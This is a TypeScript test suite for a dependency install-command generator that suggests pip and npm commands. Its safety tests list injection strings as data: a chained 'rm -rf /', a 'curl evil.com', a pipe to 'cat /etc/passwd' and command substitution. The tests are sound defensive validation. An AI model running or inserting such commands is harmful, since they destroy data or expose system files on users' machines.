/**
 * Test suite for InstallCommandGenerator
 */

import * as assert from 'assert';
import { InstallCommandGenerator } from '../../commands/installCommandGenerator';
import { DependencyIssue, SupportedLanguage, IssueType, IssueSeverity } from '../../types/types';

suite('InstallCommandGenerator Tests', () => {
  let generator: InstallCommandGenerator;

  setup(() => {
    generator = new InstallCommandGenerator();
  });

  test('Should generate pip install command for Python', () => {
    const issue: DependencyIssue = {
      id: '123',
      type: IssueType.MissingDependency,
      language: SupportedLanguage.Python,
      packageName: 'numpy',
      originalError: 'ModuleNotFoundError: No module named numpy',
      explanation: 'Test',
      severity: IssueSeverity.High,
      confidence: 90,
      suggestedCommand: '',
      timestamp: Date.now(),
    };

    const command = generator.generateCommand(issue);

    assert.strictEqual(command.language, SupportedLanguage.Python);
    assert.strictEqual(command.packageName, 'numpy');
    assert.ok(command.command.includes('pip install'));
    assert.ok(command.command.includes('numpy'));
  });

  test('Should generate npm install command for Node.js', () => {
    const issue: DependencyIssue = {
      id: '123',
      type: IssueType.MissingDependency,
      language: SupportedLanguage.NodeJS,
      packageName: 'express',
      originalError: "Cannot find module 'express'",
      explanation: 'Test',
      severity: IssueSeverity.High,
      confidence: 90,
      suggestedCommand: '',
      timestamp: Date.now(),
    };

    const command = generator.generateCommand(issue);

    assert.strictEqual(command.language, SupportedLanguage.NodeJS);
    assert.strictEqual(command.packageName, 'express');
    assert.ok(command.command.includes('npm install'));
    assert.ok(command.command.includes('express'));
  });

  test('Should provide alternative commands for Python', () => {
    const issue: DependencyIssue = {
      id: '123',
      type: IssueType.MissingDependency,
      language: SupportedLanguage.Python,
      packageName: 'requests',
      originalError: 'ModuleNotFoundError',
      explanation: 'Test',
      severity: IssueSeverity.High,
      confidence: 90,
      suggestedCommand: '',
      timestamp: Date.now(),
    };

    const command = generator.generateCommand(issue);

    assert.ok(command.alternatives);
    assert.ok(command.alternatives.length > 0);
    assert.ok(command.alternatives.some(alt => alt.includes('pip3')));
  });

  test('Should validate command safety', () => {
    const safeCommand = 'pip install numpy';
    const dangerousCommand = 'pip install numpy; rm -rf /';

    assert.strictEqual(generator.isCommandSafe(safeCommand), true);
    assert.strictEqual(generator.isCommandSafe(dangerousCommand), false);
  });

  test('Should detect injection attempts', () => {
    const injectionAttempts = [
      'pip install numpy && curl evil.com',
      'npm install express | cat /etc/passwd',
      'pip install `malicious`',
      'npm install $(echo test)',
    ];

    for (const attempt of injectionAttempts) {
      assert.strictEqual(generator.isCommandSafe(attempt), false);
    }
  });

  test('Should generate command suggestion with explanation', () => {
    const issue: DependencyIssue = {
      id: '123',
      type: IssueType.MissingDependency,
      language: SupportedLanguage.Python,
      packageName: 'pandas',
      originalError: 'ModuleNotFoundError',
      explanation: 'Test',
      severity: IssueSeverity.High,
      confidence: 95,
      suggestedCommand: '',
      timestamp: Date.now(),
    };

    const suggestion = generator.generateSuggestion(issue);

    assert.strictEqual(suggestion.packageName, 'pandas');
    assert.strictEqual(suggestion.confidence, 95);
    assert.ok(suggestion.explanation.length > 0);
    assert.ok(suggestion.installCommand.includes('pip'));
  });

  test('Should normalize package names', () => {
    const pythonIssue: DependencyIssue = {
      id: '123',
      type: IssueType.MissingDependency,
      language: SupportedLanguage.Python,
      packageName: 'pillow',
      originalError: 'Test',
      explanation: 'Test',
      severity: IssueSeverity.High,
      confidence: 90,
      suggestedCommand: '',
      timestamp: Date.now(),
    };

    const command = generator.generateCommand(pythonIssue);
    assert.ok(command.packageName);
  });
});
